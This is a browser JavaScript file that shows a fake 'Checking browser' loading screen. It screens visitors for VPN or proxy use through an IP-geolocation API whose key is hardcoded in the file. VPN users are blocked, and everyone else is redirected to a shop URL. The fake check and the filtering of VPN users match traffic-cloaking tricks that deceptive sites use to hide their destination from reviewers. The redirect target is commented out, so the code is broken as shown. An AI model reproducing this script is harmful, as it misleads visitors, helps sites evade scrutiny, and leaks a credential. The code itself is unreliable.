// Replace this with your Abstract API key
const ABSTRACT_API_KEY = "793c930ddc6f43c1bd53173a996206e9";
//const TARGET_URL = "https://manomedia.shop"; // URL to redirect users who are not using a VPN/Proxy
const MODAL_DELAY = 10000; // 10 seconds delay

// Function to fetch IP geolocation data from Abstract API
async function checkVpnOrProxy() {
    try {
        const response = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_API_KEY}`);
        const data = await response.json();

        if (data.security && (data.security.is_vpn || data.security.is_proxy)) {
            return true; // Using a VPN or Proxy
        } else {
            return false; // Not using a VPN or Proxy
        }
    } catch (error) {
        console.error("Error fetching IP geolocation data:", error);
        return null; // Handle errors gracefully
    }
}

// Function to show the modal with loading animation
function showModal(message) {
    const modal = document.createElement("div");
    modal.id = "modal";
    modal.style.position = "fixed";
    modal.style.top = "0";
    modal.style.left = "0";
    modal.style.width = "100%";
    modal.style.height = "100%";
    modal.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
    modal.style.display = "flex";
    modal.style.justifyContent = "center";
    modal.style.alignItems = "center";
    modal.style.zIndex = "9999";

    const content = document.createElement("div");
    content.style.backgroundColor = "#fff";
    content.style.padding = "40px 60px"; // Increased size
    content.style.borderRadius = "12px";
    content.style.boxShadow = "0 8px 20px rgba(0, 0, 0, 0.2)";
    content.style.maxWidth = "600px"; // Ensure it doesn't exceed screen width

    const spinner = document.createElement("div");
    spinner.className = "spinner";
    spinner.style.border = "6px solid #f3f3f3"; // Thicker border
    spinner.style.width = "80px"; // Larger spinner
    spinner.style.height = "80px"; // Larger spinner
    spinner.style.borderTop = "6px solid #2ecc71"; // Green spinner
    spinner.style.borderRadius = "50%";
    spinner.style.animation = "spin 1s linear infinite";

    const text = document.createElement("p");
    text.textContent = message;
    text.style.margin = "20px 0 0 0"; // Increased spacing
    text.style.textAlign = "center";
    text.style.fontSize = "18px"; // Larger font size

    content.appendChild(spinner);
    content.appendChild(text);
    modal.appendChild(content);

    document.body.appendChild(modal);

    // CSS animation for spinner
    const style = document.createElement("style");
    style.innerHTML = `
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
    document.head.appendChild(style);

    return modal;
}

// Function to handle the result of the check with a delay
async function handleCheckResult() {
    const modal = showModal("Checking browser, please wait...");

    // Introduce a delay of 10 seconds
    let isUsingVpnOrProxy = null;
    const checkPromise = checkVpnOrProxy();
    await new Promise((resolve) => setTimeout(resolve, MODAL_DELAY)); // Wait for 10 seconds
    isUsingVpnOrProxy = await checkPromise; // Get the result after the delay

    if (isUsingVpnOrProxy === null) {
        // Error occurred, retry after 3 seconds
        setTimeout(() => {
            handleCheckResult();
        }, 3000);
        return;
    }

    if (isUsingVpnOrProxy) {
        // User is using a VPN or Proxy
        const errorMessage = document.createElement("p");
        errorMessage.textContent = "Please turn off your VPN, Proxy, or Browser Extension to continue.";
        errorMessage.style.color = "red";
        errorMessage.style.fontWeight = "bold";
        errorMessage.style.textAlign = "center";
        errorMessage.style.marginTop = "20px"; // Increased spacing

        const refreshButton = document.createElement("button");
        refreshButton.textContent = "Refresh";
        refreshButton.style.padding = "15px 30px"; // Larger button
        refreshButton.style.marginTop = "20px"; // Increased spacing
        refreshButton.style.border = "none";
        refreshButton.style.borderRadius = "8px";
        refreshButton.style.backgroundColor = "#2ecc71"; // Green button
        refreshButton.style.color = "#fff";
        refreshButton.style.cursor = "pointer";
        refreshButton.style.fontSize = "16px"; // Larger font size
        refreshButton.addEventListener("click", () => {
            handleCheckResult(); // Retry the check
        });

        const content = modal.querySelector("div"); // Get the modal content
        content.innerHTML = ""; // Clear existing content
        content.appendChild(errorMessage);
        content.appendChild(refreshButton);

        modal.style.display = "flex"; // Keep the modal visible
    } else {
        // User is not using a VPN or Proxy
        document.getElementById("modal").remove(); // Remove the modal
        window.location.href = TARGET_URL; // Redirect to the target URL
    }
}

// Initialize the check when the page loads
document.addEventListener("DOMContentLoaded", () => {
    handleCheckResult();
});